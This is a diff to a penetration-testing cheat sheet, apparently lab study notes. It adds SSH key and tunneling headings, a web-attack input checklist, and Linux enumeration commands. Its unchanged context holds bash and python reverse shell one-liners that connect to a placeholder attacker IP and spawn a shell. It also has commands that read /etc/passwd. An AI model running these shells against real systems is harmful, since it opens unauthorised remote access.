@@ -2,6 +2,9 @@
 - [General](#general)
   - [Important Files](#important-files)
   - [Reverse Shell](#reverse-shell)
+- [SSH](#ssh)
+  - [SSH KEY](#ssh-key)
+  - [SSH Tunneling](#ssh-tunneling)
 - [Web Attacks](#web-attacks)
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   - [Manual Enumeration](#manual-enumeration)
@@ -39,10 +42,32 @@ bash -c 'bash -i >& /dev/tcp/192.168.45.x/80 0>&1'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
+```
+
+# SSH
+
+## SSH Keygen
+
+```bash
+# Generate ssh key:
+ssh-keygen
+
+# Connect with ssh key:
+ssh -i id_rsa root@192.168.x.x
+
+# To handle "Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures" error:
+ssh -i id_rsa root@192.168.x.x -o IdentitiesOnly=yes
 
 ```
 
+
 # Web Attacks
+
+## input form
+- Input form: check with burpsuite
+  - SQLi
+  - Check to see if we can modify post data
+  - 
 
 ## feroxbuster 
 ```bash
@@ -183,6 +208,9 @@ Get-Process
 # User context
 id
 hostname
+
+# User files
+cat .bash_aliases
 
 # Enumerate other userse
 cat /etc/passwd
